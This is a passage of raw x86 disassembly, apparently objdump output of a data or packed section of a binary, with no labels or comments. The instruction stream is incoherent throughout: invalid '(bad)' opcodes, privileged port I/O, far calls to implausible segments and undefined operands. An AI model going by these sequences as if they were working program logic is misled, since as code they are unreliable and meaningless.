  413f2f:	pop    ecx
  413f30:	sub    esp,DWORD PTR [edi]
  413f32:	xchg   esi,eax
  413f33:	cld    
  413f34:	ss (bad) 
  413f36:	push   0xc03dbc2f
  413f3b:	out    0x2,eax
  413f3d:	inc    edx
  413f3e:	jl     0x413efa
  413f40:	in     eax,dx
  413f41:	(bad)
  413f44:	imul   esp,DWORD PTR [eax],0xfffffff9
  413f47:	push   0xc1ab32d9
  413f4c:	mov    esp,DWORD PTR [edx]
  413f4e:	jl     0x413eed
  413f50:	(bad)  
  413f51:	lods   al,BYTE PTR ds:[esi]
  413f52:	push   edi
  413f53:	adc    ebx,esp
  413f55:	mov    al,ds:0xaf388a9
  413f5a:	xchg   ecx,eax
  413f5b:	outs   dx,DWORD PTR ds:[esi]
  413f5c:	pusha  
  413f5d:	jbe    0x413f8a
  413f5f:	mov    BYTE PTR [esi-0x64],ah
  413f62:	gs fs popf 
  413f65:	mov    bh,0x5b
  413f67:	je     0x413f77
  413f69:	push   ebp
  413f6a:	sti    
  413f6b:	lds    ecx,FWORD PTR [edx]
  413f6d:	mov    bl,0x62
  413f6f:	push   ebp
  413f70:	push   ecx
  413f71:	int    0x18
  413f73:	aaa    
  413f74:	popa   
  413f75:	call   0x2153:0xf85c0a70
  413f7c:	aam    0x1b
  413f7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f7f:	inc    ebp
  413f80:	xor    dl,BYTE PTR [ebx-0x6f]
  413f83:	jbe    0x413fb8
  413f85:	retf   0x813a
  413f88:	push   ebp
  413f89:	push   ebx
  413f8a:	pop    es
  413f8b:	xor    al,0x50
  413f8d:	retf   0xb5e9
  413f90:	xor    al,0xa3
  413f92:	in     eax,0x6c
  413f94:	pushf  
  413f95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f96:	sub    eax,0x3ebe49ec
  413f9b:	hlt    
  413f9c:	adc    ch,BYTE PTR [ecx]
  413f9e:	(bad)
  413fa1:	outs   dx,BYTE PTR ds:[esi]
  413fa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fa3:	fdiv   QWORD PTR [edi+0x6413e017]
  413fa9:	adc    eax,0xb10d0e98
  413fae:	mov    esi,0x79429ac5
  413fb3:	xlat   BYTE PTR ds:[ebx]
  413fb4:	or     eax,0x31bb5cbf
  413fb9:	das    
  413fba:	jmp    0x35ca:0xd834c678
  413fc1:	xchg   DWORD PTR [ecx+0x53b98241],esi
  413fc7:	mov    bl,0x6c
  413fc9:	enter  0x9efb,0x7a
  413fcd:	dec    edi
  413fce:	push   ds
  413fcf:	sub    edx,DWORD PTR [ebx+0x42]
  413fd2:	adc    ebp,edx
  413fd4:	jle    0x413f9d
  413fd6:	pop    esi
  413fd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fd8:	scas   al,BYTE PTR es:[edi]
  413fd9:	ret    0xd6b7
  413fdc:	int    0x9e
  413fde:	or     esi,esi
  413fe0:	and    cl,BYTE PTR [ecx+eiz*4-0x78]
  413fe4:	and    bl,ah
  413fe6:	lea    esp,[ebx+0x10478f04]
  413fec:	test   BYTE PTR [eax+0x36],dl
  413fef:	clc    
  413ff0:	xchg   edi,eax
  413ff1:	adc    BYTE PTR [ecx],bl
  413ff3:	mov    ebx,0x590ed152
  413ff8:	in     eax,dx
  413ff9:	xchg   esi,eax
  413ffa:	adc    DWORD PTR [ebx-0x7aed949a],edx
  414000:	cmp    ebx,0x2d
  414003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414004:	dec    edi
  414005:	stos   DWORD PTR es:[edi],eax
  414006:	cli    
  414007:	lods   al,BYTE PTR ds:[esi]
  414008:	sbb    al,0x28
  41400a:	mul    DWORD PTR [edx+0x3ab25d4d]
  414010:	add    al,0xd1
  414012:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414013:	lock pop esp
  414015:	dec    ecx
  414016:	push   ds
  414017:	outs   dx,BYTE PTR ds:[esi]
  414018:	mov    eax,DWORD PTR [ebp-0x1b]
  41401b:	adc    dl,ah
  41401d:	xchg   ebp,eax
  41401e:	fcomp  QWORD PTR [edx+0x2a]
  414021:	jl     0x41404b
  414023:	push   DWORD PTR [eax-0xf]
  414026:	jmp    0xc44d:0x1ccd845c
  41402d:	gs cli 
  41402f:	imul   esi,edx,0x3822ece7
  414035:	jl     0x413fce
  414037:	xchg   esi,eax
  414038:	out    dx,al
  414039:	sub    esi,ecx
  41403b:	xor    dl,ch
  41403d:	cmc    
  41403e:	add    cl,BYTE PTR [eax]
  414040:	mov    ecx,0x2324e569
  414045:	mul    DWORD PTR [ebx-0x3d]
  414048:	or     al,0x8
  41404b:	pop    edx
  41404c:	sar    DWORD PTR [eax-0x716be2fc],cl
  414052:	dec    esp
  414053:	enter  0x6b90,0x17
  414057:	ret    0x3937
  41405a:	xor    BYTE PTR [ecx+0x6968e05f],0xfa
  414061:	sahf   
  414062:	scas   eax,DWORD PTR es:[edi]
  414063:	push   ebp
  414064:	sub    al,0x92
  414066:	xor    dh,BYTE PTR [ecx+0x76]
  414069:	push   cs
  41406a:	mov    ebx,0xbb0abcfc
  41406f:	addr16 (bad) 
  414071:	fmul   DWORD PTR [edx+0xb]
  414074:	dec    ebp
  414075:	mov    eax,ds:0x3d3d828d
  41407a:	or     BYTE PTR [esp+edx*4+0x75],cl
  41407e:	out    dx,al
  41407f:	add    edi,DWORD PTR [ebx+0x6b4da5c9]
  414085:	jmp    DWORD PTR [esi]
  414087:	es das 
  414089:	inc    esp
  41408a:	dec    esi
  41408b:	jl     0x4140ee
  41408d:	data16 (bad) 
  41408f:	sbb    dl,bl
  414091:	pusha  
  414092:	lds    ebx,FWORD PTR [edx+ebx*1+0x5eb4088c]
  414099:	bnd ja 0x4140ac
  41409c:	ret    
  41409d:	or     edi,0xffffff92
  4140a0:	mov    esi,0xec231a54
  4140a5:	pop    ds
  4140a6:	cmp    dl,dl
  4140a8:	icebp  
  4140a9:	jns    0x41408a
  4140ab:	shl    ebp,1
  4140ad:	clc    
  4140ae:	loopne 0x4140af
  4140b0:	(bad)  
  4140b1:	fisttp QWORD PTR [edx+0x55]
  4140b4:	mov    WORD PTR [ecx-0x24],?
  4140b7:	nop    DWORD PTR [edi-0x305e4d41]
  4140be:	loopne 0x414073
  4140c0:	repnz or DWORD PTR [esi-0x796399db],0xffffffac
  4140c8:	mov    edx,DWORD PTR [esi-0x6d]
  4140cb:	cs push esi
  4140cd:	sub    BYTE PTR [edx],dh
  4140cf:	push   cs
  4140d0:	jge    0x414100
  4140d2:	sbb    eax,0x25638866
  4140d7:	popa   
  4140d8:	retf   
  4140d9:	mov    WORD PTR [edi],cs
  4140db:	and    bl,BYTE PTR [edi-0x22d95ced]
  4140e1:	mov    bh,0x5a
  4140e3:	dec    esp
  4140e4:	jge    0x414068
  4140e6:	aaa    
  4140e7:	xchg   edi,eax
  4140e8:	and    DWORD PTR [ecx+0x33605d9],0xdc3708ab
  4140f2:	nop
  4140f3:	xor    bh,BYTE PTR [edx]
  4140f5:	in     eax,0xca
  4140f7:	push   eax
  4140f8:	scas   al,BYTE PTR es:[edi]
  4140f9:	xlat   BYTE PTR ds:[ebx]
  4140fa:	jae    0x414175
  4140fc:	dec    edx
  4140fd:	push   es
  4140fe:	hlt    
  4140ff:	out    dx,al
  414100:	test   eax,0x834069d
  414105:	jl     0x4140d4
  414107:	sbb    eax,0xc231d39b
  41410d:	xor    bh,BYTE PTR [ebx]
  41410f:	or     al,0x50
  414111:	pop    ebx
  414112:	dec    edx
  414113:	outs   dx,BYTE PTR ds:[esi]
  414114:	push   ds
  414115:	xlat   BYTE PTR ds:[ebx]
  414116:	es mov ch,0xba
  414119:	pop    edi
  41411a:	pop    edx
  41411b:	call   0x8ccd:0xa2554aed
  414122:	adc    edx,DWORD PTR [ebp+0x5e]
  414125:	pop    eax
  414126:	out    0x61,al
  414128:	xchg   edi,eax
  414129:	cmp    eax,0xfb6f57a8
  41412e:	int    0xdc
  414130:	add    ah,BYTE PTR [ebp+0x41]
  414133:	jle    0x414127
  414135:	pop    ss
  414136:	imul   esi,edx,0x22e40953
  41413c:	mov    ch,0xa2
  41413e:	imul   ebx,DWORD PTR [edx+eiz*2+0xf],0x5f3da13c
  414146:	out    dx,eax
  414147:	outs   dx,BYTE PTR ds:[esi]
  414148:	jo     0x414101
  41414a:	inc    esi
  41414b:	pop    ebp
  41414c:	push   edx
  41414d:	fdivrp st(5),st
  41414f:	test   DWORD PTR [edi-0x69d636e6],edx
  414155:	mov    ecx,DWORD PTR [ebx]
  414157:	fstp   TBYTE PTR [ebp+0x62]
  41415a:	dec    esp
  41415b:	cli    
  41415c:	enter  0xa231,0xee
  414160:	sbb    BYTE PTR [ebx-0x52d38f2],0x89
  414167:	lds    esi,FWORD PTR [edi+0x74eb190b]
  41416d:	imul   esi,DWORD PTR [esi+edx*8+0x58531f7e],0xc3ca98c0
  414178:	mov    esp,0x54d409fc
  41417d:	vxorps xmm2,xmm0,XMMWORD PTR [eax]
  414181:	je     0x414166
  414183:	adc    al,0xda
  414185:	or     eax,0x49597d65
  41418a:	adc    ebp,DWORD PTR ds:[esi*4+0x7f37aefa]
  414192:	adc    dl,ah
  414194:	add    bh,BYTE PTR [edx]
  414196:	repz test al,0xa5
  414199:	arpl   bx,si
  41419b:	ficomp WORD PTR [eax+0x6d]
  41419e:	lds    esp,FWORD PTR [eax+eiz*1+0x65]
  4141a2:	push   esp
  4141a3:	(bad)  
  4141a4:	in     al,dx
  4141a5:	loopne 0x414177
  4141a7:	sbb    al,0xa
  4141a9:	xor    edi,eax
  4141ab:	cmp    eax,0xcac35b82
  4141b0:	fstp   DWORD PTR [ecx-0x25]
  4141b3:	xor    BYTE PTR [edi],0x29
  4141b6:	pusha  
  4141b7:	mov    BYTE PTR [edx+0x56b6c83a],ah
  4141bd:	aas    
  4141be:	popa   
  4141bf:	xor    ch,BYTE PTR [eax]
  4141c1:	sbb    esp,0xc6d2f0df
  4141c7:	xor    BYTE PTR [edi+0x4f],bh
  4141ca:	add    al,0xba
  4141cc:	or     al,0xfd
  4141ce:	cmc    
  4141cf:	pop    ebp
  4141d0:	mov    ds:0xcbf62872,al
  4141d5:	out    dx,eax
  4141d6:	push   cs
  4141d7:	(bad)  
  4141d8:	jbe    0x4141eb
  4141da:	mov    eax,0xfada6634
  4141df:	add    eax,0x4980019e
  4141e4:	test   ebp,edx
  4141e6:	pushf  
  4141e7:	xchg   BYTE PTR ds:0x4cc83195,bh
  4141ed:	stos   BYTE PTR es:[edi],al
  4141ee:	clc    
  4141ef:	outs   dx,DWORD PTR ds:[esi]
  4141f0:	ins    DWORD PTR es:[edi],dx
  4141f1:	xchg   DWORD PTR [eax+0x3cfcc157],edx
  4141f7:	jno    0x41419b
  4141f9:	loope  0x4141ca
  4141fb:	retf   0x6244
  4141fe:	fcomp  DWORD PTR [ebp+0x458f0e2b]
  414204:	pop    eax
  414205:	stos   BYTE PTR es:[edi],al
  414206:	hlt    
  414207:	out    dx,eax
  414208:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414209:	shl    BYTE PTR [eax+esi*4],0xd7
  41420d:	jne    0x4141cd
  41420f:	arpl   WORD PTR [edx-0x65],di
  414212:	sbb    edi,DWORD PTR [edi+ebx*2-0x2ac2c1b2]
  414219:	in     eax,dx
  41421a:	cmp    BYTE PTR [edx-0x19b9c1f4],cl
  414220:	nop
  414221:	xchg   esp,eax
  414222:	jmp    0x41423f
  414224:	dec    ecx
  414225:	pushf  
  414226:	xchg   esi,eax
  414227:	xor    dh,BYTE PTR [ebx-0x444a85a7]
  41422d:	sbb    BYTE PTR [ebp+0x46],dl
  414230:	or     esi,DWORD PTR [esi+eiz*8+0x29]
  414234:	mov    dh,0x22
  414236:	sub    eax,0x21e62dba
  41423b:	mov    cl,BYTE PTR ds:0x18bf25e5
  414241:	ror    ch,cl
  414243:	and    al,0x90
  414245:	mov    ebx,0xa5567b33
  41424a:	sbb    bl,BYTE PTR [ebx+0x75a549c6]
  414250:	mov    fs,WORD PTR [edx]
  414252:	xchg   DWORD PTR [ebp+0x15],ecx
  414255:	or     bh,BYTE PTR [ecx]
  414257:	add    eax,0x90fb07b7
  41425c:	mov    dh,BYTE PTR [ebx+0x38]
  41425f:	add    al,0xb0
  414261:	add    eax,0x1f095a13
  414266:	cmp    esi,eax
  414268:	sar    DWORD PTR [eax+0x63d55c5a],0xbe
  41426f:	and    DWORD PTR [ecx],edx
  414271:	jmp    0x4141f3
  414273:	cmc    
  414274:	mov    ah,0x13
  414276:	xchg   DWORD PTR [ebp-0x77131807],ebx
  41427c:	xor    DWORD PTR [ecx-0x6ac22ccd],esp
  414282:	dec    edx
  414283:	call   0xd2e10b17
  414288:	aam    0xe0
  41428a:	call   0x4486:0x6074be24
  414291:	and    esi,DWORD PTR [ebp+0x72]
  414294:	pop    es
  414295:	and    ebx,esi
  414297:	mov    DWORD PTR [ebp+ecx*2+0x3d],ecx
  41429b:	xchg   esp,eax
  41429c:	and    BYTE PTR [ebx+eiz*1],dl
  41429f:	mov    cl,0x1b
  4142a1:	test   BYTE PTR [edx-0x37a4ab9f],0x6d
  4142a8:	cdq    
  4142a9:	enter  0x8647,0x16
  4142ad:	push   cs
  4142ae:	jno    0x4142e9
  4142b0:	jb     0x4142e8
  4142b2:	les    ecx,FWORD PTR [ebp+edi*4-0x62]
  4142b6:	jmp    0x4142bc
  4142b8:	xor    esp,DWORD PTR [ebx]
  4142ba:	ins    DWORD PTR es:[edi],dx
  4142bb:	cs pop ss
  4142bd:	fsubrp st(2),st
  4142bf:	pop    eax
  4142c0:	dec    ebp
  4142c1:	sub    edi,ebp
  4142c3:	stos   BYTE PTR es:[edi],al
  4142c4:	call   0xed845208
  4142c9:	ds out 0x2,eax
  4142cc:	mov    edx,0x4342b42a
  4142d1:	mov    ds:0xa5dd2dcb,eax
  4142d6:	loopne 0x414286
  4142d8:	pop    DWORD PTR [edx+0x4ea90f50]
  4142de:	arpl   WORD PTR [esi-0xfd1b70c],sp
  4142e4:	aaa    
  4142e5:	cmc    
  4142e6:	call   0xbba2:0xabe13d89
  4142ed:	dec    eax
  4142ee:	loope  0x4142aa
  4142f0:	test   BYTE PTR [eax+edx*4+0xa],ch
  4142f4:	loope  0x414292
  4142f6:	rcl    BYTE PTR [eax],1
  4142f8:	xor    bl,dl
  4142fa:	ficom  WORD PTR [esi]
  4142fc:	sti    
  4142fd:	test   al,0x69
  4142ff:	add    esi,DWORD PTR [ecx]
  414301:	mov    ds:0x1b565139,eax
  414306:	into   
  414307:	cmp    BYTE PTR [edx+0x7],bh
  41430a:	lea    ebp,[esi+0x6fa06315]
  414310:	fst    st(7)
  414312:	pop    esi
  414313:	xor    bh,cl
  414315:	jecxz  0x41438d
  414317:	mov    ecx,0xa17fd200
  41431c:	rcl    BYTE PTR [esi+0x6be5d0a2],1
  414322:	out    dx,al
  414323:	fldenv [ebx-0x37]
  414326:	in     al,0xf
  414328:	xchg   edx,eax
  414329:	(bad)  
  41432a:	out    dx,eax
  41432b:	popf   
  41432c:	std    
  41432d:	loop   0x4142f3
  41432f:	mov    esi,0x58eecf8b
  414334:	push   edi
  414335:	sub    eax,0x65aedf01
  41433a:	cdq    
  41433b:	mov    eax,ds:0x4d40349e
  414340:	dec    eax
  414341:	sub    eax,0xc7ee0bb6
  414346:	and    esp,ecx
  414348:	mov    BYTE PTR [edx+0x5098d7c],0xc4
  41434f:	mul    DWORD PTR [edx]
  414351:	push   ds
  414352:	test   DWORD PTR [ecx-0x1f2d3efd],ecx
  414358:	fs jb  0x414355
  41435b:	mov    WORD PTR [esi+0x5c],es
  41435e:	pop    ebp
  41435f:	out    dx,eax
  414360:	or     eax,0x290da54d
  414365:	xor    edi,DWORD PTR [ecx+edi*4]
  414368:	rcr    BYTE PTR [ecx],0x98
  41436b:	lods   al,BYTE PTR ds:[esi]
  41436c:	sti    
  41436d:	xchg   edx,eax
  41436e:	add    edx,esi
  414370:	xor    esi,0x3d
  414373:	sti    
  414374:	das    
  414375:	add    DWORD PTR [ebx+0x59537b1b],0xfea00b8e
  41437f:	pop    ebx
  414380:	scas   al,BYTE PTR es:[edi]
  414381:	pop    edx
  414382:	jge    0x4143ef
  414384:	xchg   edx,eax
  414385:	dec    edx
  414386:	or     ebx,DWORD PTR [edx]
  414388:	test   BYTE PTR [esp+eax*2+0x54],dh
  41438c:	xchg   DWORD PTR [esi],eax
  41438e:	outs   dx,DWORD PTR ds:[esi]
  41438f:	mov    ebx,0xd744b6ee
  414394:	cs mov esp,esp
  414397:	das    
  414398:	jle    0x4143c3
  41439a:	or     BYTE PTR [ecx+0x1],al
  41439d:	mov    ah,0xd8
  41439f:	cmp    eax,0xb6e524b6
  4143a4:	fwait
  4143a5:	pop    ss
  4143a6:	jb     0x41436c
  4143a8:	pop    ecx
  4143a9:	push   edi
  4143aa:	mov    bh,0x69
  4143ac:	gs xchg edx,eax
  4143ae:	pop    ds
  4143af:	loope  0x4143f7
  4143b1:	shl    BYTE PTR [esi],cl
  4143b3:	icebp  
  4143b4:	add    ch,BYTE PTR [ebx+0x4]
  4143b7:	sbb    BYTE PTR [edx-0x63],ah
  4143ba:	test   al,0xa2
  4143bc:	mov    ah,0x59
  4143be:	sub    DWORD PTR [ebx-0x41],edx
  4143c1:	fild   WORD PTR [esp+eax*8-0x2f]
  4143c5:	into   
  4143c6:	retf   0xa433
  4143c9:	mov    bh,BYTE PTR [eax]
  4143cb:	cs and al,0x50
  4143ce:	inc    ecx
  4143cf:	xor    eax,DWORD PTR ds:0x545280f7
  4143d5:	call   0xdc818f99
  4143da:	mov    ch,0xc1
  4143dc:	fidivr DWORD PTR [ebp-0x7435d9c0]
  4143e2:	push   edi
  4143e3:	xchg   DWORD PTR [ecx+ebp*1-0x45],edi
  4143e7:	test   DWORD PTR [eax-0x10d6427a],0x2576249f
  4143f1:	cmp    dl,ah
  4143f3:	mov    ecx,0x1f54cc5e
  4143f8:	loopne 0x4143ad
  4143fa:	jmp    0x3f81c0e
  4143ff:	pop    ebx
  414400:	fnsave [eax]
  414402:	or     eax,0x828bc27e
  414407:	fcmovne st,st(7)
  414409:	xor    al,0xc7
  41440b:	adc    BYTE PTR [ebp-0x1a10f7c7],bl
  414411:	cwde   
  414412:	xlat   BYTE PTR ds:[ebx]
  414413:	(bad)  
  414414:	mov    ah,0x80
  414416:	dec    eax
  414417:	ja     0x41442e
  414419:	loopne 0x4143b8
  41441b:	fmul   st,st(7)
  41441d:	retf   0x9739
  414420:	call   0x5395dd9e
  414425:	test   DWORD PTR [ebx+0x21e48698],esp
  41442b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41442c:	pop    es
  41442d:	hlt    
  41442e:	imul   ecx,esp,0x9cff984f
  414434:	inc    edx
  414435:	pop    ecx
  414436:	inc    eax
  414437:	int3   
  414438:	loopne 0x414494
  41443a:	call   0x4b48:0xcb77f1db
  414441:	mov    ds:0xad4e72a7,eax
  414446:	mov    ah,0xce
  414448:	jbe    0x414444
  41444a:	lahf   
  41444b:	pusha  
  41444c:	out    dx,eax
  41444d:	and    ch,BYTE PTR ds:0xc080a4d8
  414453:	aad    0x5f
  414455:	dec    esi
  414456:	add    cl,BYTE PTR [edi+0x575f5468]
  41445c:	mov    eax,0xba0ac0e1
  414461:	in     eax,0xf6
  414463:	push   0x16
  414465:	test   esp,esp
  414467:	mov    ah,dh
  414469:	inc    esp
  41446a:	sub    ebp,ebp
  41446c:	rol    DWORD PTR [edi],cl
  41446e:	(bad)  
  41446f:	test   eax,0xf4a10824
  414474:	sbb    bh,dl
  414476:	outs   dx,BYTE PTR ds:[esi]
  414477:	loopne 0x414491
  414479:	xchg   DWORD PTR [esi+0x5e],ebx
  41447c:	in     eax,0x7b
  41447e:	pop    edx
  414480:	mov    bh,0xee
  414482:	daa    
  414483:	cs dec edi
  414485:	loop   0x414478
  414487:	loopne 0x41448a
  414489:	retf   0xe0f6
  41448c:	add    dh,BYTE PTR [edx+ebp*4-0x4fec9452]
  414493:	push   ds
  414494:	jg     0x4144a5
  414496:	push   ds
  414497:	arpl   di,cx
  414499:	sub    eax,0xbe62b17b
  41449e:	lahf   
  41449f:	jo     0x414504
  4144a1:	mov    al,0x30
  4144a3:	cmc    
  4144a4:	inc    edi
  4144a5:	shl    dh,0x1b
  4144a8:	call   0x5de961ae
  4144ad:	xchg   BYTE PTR cs:[esi+ebx*4],ch
  4144b1:	leave  
  4144b2:	in     al,dx
  4144b3:	pop    edi
  4144b4:	sub    dh,BYTE PTR [esi]
  4144b6:	cmp    BYTE PTR [ebp+0x27],0x7f
  4144ba:	mov    al,0xdb
  4144bc:	gs push 0xc17de8b7
  4144c2:	cmp    bh,BYTE PTR ds:0x8e533b85
  4144c8:	cld    
  4144c9:	into   
  4144ca:	ror    BYTE PTR [esi+ecx*1],1
  4144cd:	jp     0x41446d
  4144cf:	repnz pop es
  4144d1:	xchg   ebx,eax
  4144d2:	and    al,0x7f
  4144d4:	(bad)  
  4144d5:	test   DWORD PTR [eax-0x356af022],0x3e8a2bc6
  4144df:	test   al,0xb6
  4144e1:	fmul   DWORD PTR [ecx+edi*4+0x5]
  4144e5:	jle    0x4144b0
  4144e7:	sbb    DWORD PTR [ecx],edx
  4144e9:	nop
  4144ea:	pop    edx
  4144eb:	pop    ecx
  4144ec:	rcr    DWORD PTR [edi],1
  4144ee:	adc    al,0xf7
  4144f0:	jae    0x4144b0
  4144f2:	leave  
  4144f3:	test   BYTE PTR [eax],ch
  4144f5:	add    DWORD PTR [ecx+0x27],ebp
  4144f8:	jl     0x4144e9
  4144fa:	repz sub eax,DWORD PTR [edi+0x27]
  4144fe:	stos   DWORD PTR es:[edi],eax
  4144ff:	stos   BYTE PTR es:[edi],al
  414500:	ret    
  414501:	sbb    dl,bl
  414503:	xlat   BYTE PTR ds:[ebx]
  414504:	addr16 and eax,0xd501dd1
  41450a:	addr16 pop ebx
  41450c:	sbb    ah,BYTE PTR [ebx]
  41450e:	add    DWORD PTR [ebx+ecx*2+0x764a7568],esp
  414515:	push   ebp
  414516:	les    ebx,FWORD PTR [edx]
  414518:	pop    es
  414519:	and    ah,ch
  41451b:	mov    dl,0x31
  41451d:	enter  0x81be,0xfc
  414521:	(bad)  
  414522:	daa    
  414523:	adc    eax,0x3abe6b2e
  414528:	jg     0x4144ba
  41452a:	inc    ebp
  41452b:	dec    ebx
  41452c:	inc    ecx
  41452d:	dec    ebx
  41452e:	and    esp,DWORD PTR [ecx+0x72]
  414531:	and    ch,BYTE PTR [esi+0x2955c8d4]
  414537:	sbb    BYTE PTR ds:0xedf71a8c,ch
  41453d:	xor    dh,BYTE PTR [esi+0x504d5c5d]
  414543:	cwde   
  414544:	into   
  414545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414546:	cmp    cl,ch
  414548:	mov    cl,0x3
  41454a:	test   BYTE PTR [esi-0x1f83557b],0x9a
  414551:	sub    ecx,DWORD PTR [ebx-0x2a]
  414554:	ret    0xcb4a
  414557:	mov    al,0xa7
  414559:	sub    BYTE PTR [esi-0x7bdec9e],cl
  41455f:	(bad)  
  414560:	sbb    BYTE PTR [edi+edx*8+0x169a7a4a],dl
  414567:	cmp    DWORD PTR [edx+0xb79f4b],ebp
  41456d:	or     DWORD PTR [eax-0x7d83dec],0x5d
  414574:	xchg   BYTE PTR [eax],ah
  414576:	inc    ecx
  414577:	mov    ds:0x5daf0471,al
  41457c:	pop    ecx
  41457d:	xor    al,0x78
  41457f:	pop    ss
  414580:	fist   WORD PTR [ebp+edx*2+0x4c]
  414584:	adc    cl,dh
  414586:	pop    ds
  414587:	icebp  
  414588:	mov    bl,0x2d
  41458a:	retf   
  41458b:	push   0xfffffff4
  41458d:	iret   
  41458e:	jo     0x4145ef
  414590:	int3   
  414591:	jnp    0x41456d
  414593:	sbb    bh,BYTE PTR [edi+0xfdbb170]
  414599:	rol    DWORD PTR [eax-0x76],1
  41459c:	lods   eax,DWORD PTR ds:[esi]
  41459d:	sub    eax,0x541c080f
  4145a2:	hlt    
  4145a3:	dec    esi
  4145a4:	xor    ebx,DWORD PTR [ecx+0x1ee780c]
  4145aa:	inc    ebp
  4145ab:	iret   
  4145ac:	mov    DWORD PTR [eax-0x5c],0x9d744d52
  4145b3:	(bad)  
  4145b4:	aaa    
  4145b5:	push   edi
  4145b6:	cdq    
  4145b7:	sbb    al,0x1d
  4145b9:	dec    ebp
  4145ba:	mov    ebp,0x9f6bcaa3
  4145bf:	cmp    BYTE PTR [eax+esi*1+0x3f5eba60],0xf9
  4145c7:	mov    cl,0xba
  4145c9:	pop    ds
  4145ca:	sub    ebx,0x24
  4145cd:	push   ecx
  4145ce:	mov    bl,0x65
  4145d0:	loop   0x414592
  4145d2:	sbb    DWORD PTR [esp+ecx*1+0x1e],0xffffff9f
  4145d7:	pushf  
  4145d8:	mov    ss,WORD PTR [ecx-0x663424a8]
  4145de:	cmp    eax,0xa54f743f
  4145e3:	imul   edi,DWORD PTR [ebx+edx*2-0x47],0x1d6cc550
  4145eb:	sahf   
  4145ec:	outs   dx,BYTE PTR ds:[esi]
  4145ed:	call   0x132e:0x1fe770fd
  4145f4:	fiadd  DWORD PTR [edi+0x7abb7dd0]
  4145fa:	or     edx,esi
  4145fc:	push   0xffffffc6
  4145fe:	mov    dl,0x2f
  414600:	aam    0xed
  414602:	pushf  
  414603:	cmp    DWORD PTR fs:[ebx],esi
  414606:	rol    BYTE PTR [esp+ebp*1+0x69],cl
  41460a:	jns    0x4145b7
  41460c:	jae    0x414686
  41460e:	clc    
  41460f:	push   ebp
  414610:	les    ecx,FWORD PTR [ebx]
  414612:	lods   eax,DWORD PTR ds:[esi]
  414613:	fisttp WORD PTR [edx-0x75953fc7]
  414619:	fnstcw WORD PTR [eax]
  41461b:	scas   al,BYTE PTR es:[edi]
  41461c:	sub    ch,BYTE PTR [ebx+eiz*4]
  41461f:	repz aam 0x8
  414622:	xor    al,0x13
  414624:	je     0x4145e6
  414626:	sub    dl,bh
  414628:	adc    DWORD PTR ds:0x8afc9e1a,ebx
  41462e:	shl    BYTE PTR [eax-0x30],0xe6
  414632:	jno    0x414684
  414634:	and    ebp,DWORD PTR [edx]
  414636:	mov    dl,0xd4
  414638:	sar    DWORD PTR [ebx-0x463b79c5],cl
  41463e:	add    edx,DWORD PTR [ebx+edi*4+0x59]
  414642:	cmp    eax,0x841ddcfe
  414647:	and    cl,bh
  414649:	(bad)  
  41464a:	sub    al,0xd9
  41464c:	jg     0x414637
  41464e:	xchg   edx,eax
  41464f:	ror    DWORD PTR [eax-0x6d],1
  414652:	push   eax
  414653:	outs   dx,DWORD PTR ds:[esi]
  414654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414655:	in     al,0xe
  414657:	loopne 0x414670
  414659:	fs jns 0x414662
  41465c:	push   edi
  41465d:	addr16 dec bp
  414660:	jmp    0x4146aa
  414662:	mov    ?,edx
  414664:	into   
  414665:	arpl   WORD PTR [edi],cx
  414667:	inc    ebp
  414668:	cmp    BYTE PTR [edi+eax*8+0x11efdc88],ch
  41466f:	leave  
  414670:	outs   dx,BYTE PTR ds:[esi]
  414671:	jg     0x4146e0
  414673:	out    0x60,al
  414675:	push   ebp
  414676:	inc    edi
  414677:	push   ecx
  414678:	push   edi
  414679:	aad    0x22
  41467b:	mov    bh,0xd0
  41467d:	ds leave 
  41467f:	jns    0x41465b
  414681:	cmp    dl,bh
  414683:	dec    esp
  414684:	and    eax,esp
  414686:	cmp    DWORD PTR [edx-0x5ef1bf37],esp
  41468c:	xchg   esi,eax
  41468d:	cld    
  41468e:	jecxz  0x4146dc
  414690:	dec    edi
  414691:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  414693:	out    0x84,al
  414695:	in     al,0xcd
  414697:	mov    BYTE PTR [ecx],dh
  414699:	mov    edi,0x22f865a3
  41469e:	mov    ecx,0xe6e6eaf8
  4146a3:	ret    
  4146a4:	test   DWORD PTR [edx+0xd321c00],ebp
  4146aa:	iret   
  4146ab:	jg     0x4146dd
  4146ad:	adc    al,0xc7
  4146af:	pusha  
  4146b0:	or     edx,DWORD PTR [ebp-0x64]
  4146b3:	enter  0xc711,0x8
  4146b7:	xchg   esi,eax
  4146b8:	sub    ebp,DWORD PTR [ecx+eax*2-0x2f6ae13b]
  4146bf:	and    edx,0x57
  4146c2:	popf   
  4146c3:	cmp    al,0x6f
  4146c5:	inc    ebx
  4146c6:	jbe    0x4146ce
  4146c8:	cs jnp 0x41468d
  4146cb:	mov    ah,0x88
  4146cd:	fld    TBYTE PTR [esi]
  4146cf:	cmp    bh,BYTE PTR [ecx+ebp*4]
  4146d2:	leave  
  4146d3:	or     ebx,DWORD PTR [ecx]
  4146d5:	jle    0x41470f
  4146d7:	pushf  
  4146d8:	mov    cl,0x55
  4146da:	mov    edx,0xb07c2d6a
  4146df:	inc    esp
  4146e0:	test   esi,0x7643358d
  4146e6:	or     eax,0x9ece89a6
  4146eb:	xlat   BYTE PTR ds:[ebx]
  4146ec:	mov    ds:0xe9163ea4,al
  4146f1:	mov    dh,0x17
  4146f3:	test   eax,0x746010c6
  4146f8:	push   ecx
  4146f9:	pop    ebp
  4146fa:	addr16 sub al,0xf4
  4146fd:	xchg   BYTE PTR [eax+0x42],cl
  414700:	pop    esi
  414701:	and    BYTE PTR [ecx+0x442e7187],0xd6
  414708:	push   edi
  414709:	xor    al,0xc9
  41470b:	or     bh,BYTE PTR [ecx+0x12]
  41470e:	push   ecx
  41470f:	jmp    DWORD PTR [esi-0x69cb7cd]
  414715:	lock pop ss
  414717:	out    0x82,eax
  414719:	inc    esi
